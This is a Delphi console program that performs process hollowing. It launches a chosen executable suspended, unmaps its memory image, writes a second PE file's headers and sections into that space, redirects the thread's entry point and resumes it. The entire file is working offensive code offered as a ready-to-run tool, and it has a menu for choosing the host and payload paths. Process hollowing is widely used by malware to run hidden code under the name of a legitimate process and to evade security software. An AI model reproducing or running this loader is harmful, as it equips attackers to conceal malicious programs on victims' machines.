program ProcessHollowing;

{$APPTYPE CONSOLE}

(*
  Made by MeiMei
  Process Hollowing program with delphi console
*)

uses
  Windows, SysUtils, Classes, TlHelp32, NativeAPI;

var
  Path1, Path2: string;

function GetVal(lPtr: pointer; lSize: Integer = $4): LongInt;
var
  status: NTSTATUS;
  resultvalue: LongInt;
begin
  status := ZwWriteVirtualMemory(GetCurrentProcess, @resultvalue, lPtr, lSize, nil);
  if status <> STATUS_SUCCESS then
  begin
    Writeln('GetNumb ZwWriteVirtualMemory failed: ' + inttohex(status,8));
    Result := 0;
    Exit;
  end;
  Result := resultvalue;
end;

function Hollow(var bvBuff: TBytes; const sHost: string): Boolean;
var
  hModuleBase: LongWord;
  hPE, hSec, ImageBase, i: LongWord;
  tSTARTUPINFO: TStartupInfoW;
  tPROCESS_INFORMATION: TProcessInformation;
  tCONTEXT: array[0..49] of LongWord;
  TempResult: Integer;
  status: NTSTATUS;
  hProcess: THandle;
begin
  Result := False;
  hModuleBase := LongWord(@bvBuff[0]);

  ZeroMemory(@tSTARTUPINFO, SizeOf(tSTARTUPINFO));
  tSTARTUPINFO.cb := SizeOf(tSTARTUPINFO);
  ZeroMemory(@tPROCESS_INFORMATION, SizeOf(tPROCESS_INFORMATION));

  Writeln('hModuleBase: ', inttohex(hModuleBase,8));
  if GetVal(Pointer(hModuleBase), 2) <> $5A4D then
  begin
    Writeln('GetNumb failed for hModuleBase');
    Exit;
  end;
  Writeln('GetNumb passed for hModuleBase');

  hPE := LongWord(hModuleBase) + LongWord(GetVal(Pointer(hModuleBase + $3C)));
  Writeln('hPE: ', inttohex(hPE,8));
  if GetVal(Pointer(hPE)) <> $4550 then
  begin
    Writeln('GetNumb failed for hPE');
    Exit;
  end;
  Writeln('GetNumb passed for hPE');

  ImageBase := GetVal(Pointer(hPE + $34));
  Writeln('ImageBase: ', inttohex(ImageBase,8));

  FillChar(tSTARTUPINFO, SizeOf(tSTARTUPINFO), 0);
  tSTARTUPINFO.cb := SizeOf(tSTARTUPINFO);

  if CreateProcessW(PChar(sHost), nil, nil, nil, False, $4, nil, nil, tSTARTUPINFO, tPROCESS_INFORMATION) = False then
  begin
    Writeln('CreateProcessW failed.');
    Exit;
  end;
  Writeln('CreateProcessW success');
  sleep(100);

  hProcess := tPROCESS_INFORMATION.hProcess;
  Writeln('Process Name: ', ExtractFileName(sHost));
  Writeln('Process Handle1: ', tPROCESS_INFORMATION.hProcess);
  Writeln('Process Thread: ', tPROCESS_INFORMATION.hThread);
  Writeln('Process ID: ', tPROCESS_INFORMATION.dwProcessId);
  Writeln('Process ThreadID: ', tPROCESS_INFORMATION.dwThreadId);

  status := ZwUnmapViewOfSection(hProcess, pointer(ImageBase));
  if status <> STATUS_SUCCESS then
  begin
    Writeln('ZwUnmapViewOfSection failed: ' + inttohex(status,8));
    Exit;
  end;
  Writeln('ZwUnmapViewOfSection success.');

  TempResult := GetVal(Pointer(hPE + $50));
  status := ZwAllocateVirtualMemory(hProcess, @ImageBase, 0, @TempResult, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if status <> STATUS_SUCCESS then
  begin
    Writeln('ZwAllocateVirtualMemory failed: ' + inttohex(status,8));
    Exit;
  end;
  Writeln('ZwAllocateVirtualMemory success.');

  status := ZwWriteVirtualMemory(hProcess, ptr(ImageBase), @bvBuff[0], GetVal(Pointer(hPE + $54)), nil);
  if status <> STATUS_SUCCESS then
  begin
    Writeln('ZwWriteVirtualMemory(1) failed: ' + inttohex(status,8));
    Exit;
  end;
  Writeln('ZwWriteVirtualMemory(1) success.');

  for i := 0 to GetVal(Pointer(hPE + $6), 2) - 1 do
  begin
    hSec := hPE + $F8 + ($28 * i);
    status := ZwWriteVirtualMemory(hProcess,
      Pointer(ImageBase + GetVal(Pointer(hSec + $C))),
      Pointer(hModuleBase + GetVal(Pointer(hSec + $14))),
      GetVal(Pointer(hSec + $10)),
      nil);
    if status <> STATUS_SUCCESS then
    begin
      Writeln('ZwWriteVirtualMemory failed in loop: ' + inttohex(status,8));
      Exit;
    end;
  end;
  Writeln('ZwWriteVirtualMemory success in loop.');

  FillChar(tCONTEXT, SizeOf(tCONTEXT), 0);
  tCONTEXT[0] := $10007;
  status := ZwGetContextThread(tPROCESS_INFORMATION.hThread, @tCONTEXT);
  if status <> STATUS_SUCCESS then
  begin
    Writeln('ZwGetContextThread failed: ' + inttohex(status,8));
    Exit;
  end;
  Writeln('ZwGetContextThread success.');
  Writeln('tCONTEXT[41]: ', IntToHex(tCONTEXT[41], 8));

  status := ZwWriteVirtualMemory(hProcess, ptr(tCONTEXT[41] + $8), @ImageBase, $4, nil);
  if status <> STATUS_SUCCESS then
  begin
    Writeln('ZwWriteVirtualMemory(2) failed: ' + inttohex(status,8));
    Writeln(inttohex(NativeUInt(Pointer(tCONTEXT[41] + $8)),8));
    Writeln('ImageBase ptr: ', IntToHex(NativeUInt(@ImageBase), 8));
    Exit;
  end;
  Writeln('ZwWriteVirtualMemory(2) success.');

  tCONTEXT[44] := ImageBase + GetVal(Pointer(hPE + $28));
  status := ZwSetContextThread(tPROCESS_INFORMATION.hThread, @tCONTEXT);
  if status <> STATUS_SUCCESS then
  begin
    Writeln('ZwSetContextThread failed: ' + inttohex(status,8));
    Exit;
  end;
  Writeln('ZwSetContextThread success.');

  status := ZwResumeThread(tPROCESS_INFORMATION.hThread, nil);
  if status <> STATUS_SUCCESS then
  begin
    Writeln('ZwResumeThread failed: ' + inttohex(status,8));
    Exit;
  end;
  Writeln('ZwResumeThread success.');

  Result := True;
end;

procedure GetPaths; forward;
procedure Main;
var
  x: TBytes;
  FileStream: TFileStream;
  FileSize: Int64;
begin
  try
    FileStream := TFileStream.Create(Path2, fmOpenRead);
    try
      FileSize := FileStream.Size;
      SetLength(x, FileSize);
      FileStream.ReadBuffer(x[0], FileSize);
    finally
      FileStream.Free;
    end;

    if Hollow(x, Path1) then
    begin
      Sleep(100);
      Writeln('Process Hollowing Successful.');
      Writeln('Done. Press "ENTER" Key to continue...');
      Readln;
    end
    else
    begin
      Writeln('Process Hollowing Failed.');
    end;
  except
    on E: Exception do
    begin
      Writeln('Exception: ', E.ClassName, ': ', E.Message);
    end;
  end;
end;

procedure GetPaths;
var
  choice: integer;
  continueProgram: Boolean;
begin
  continueProgram := True;

  repeat
    Writeln('1. Run "Process Hollowing"');
    Writeln('2. Exit');
    Write('Select: ');
    Readln(choice);

    case choice of
      1:
        begin
          Write('Please enter the path of the file to run: ');
          Readln(Path1);
          Write('Please enter the path of the file to be replaced: ');
          Readln(Path2);
          Main;
        end;
      2:
        begin
          Writeln('Exit...');
          continueProgram := False;
        end;
    else
      Writeln('This number does not exist.');
    end;
  until not continueProgram;

end;

begin
  try
    GetPaths;
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.

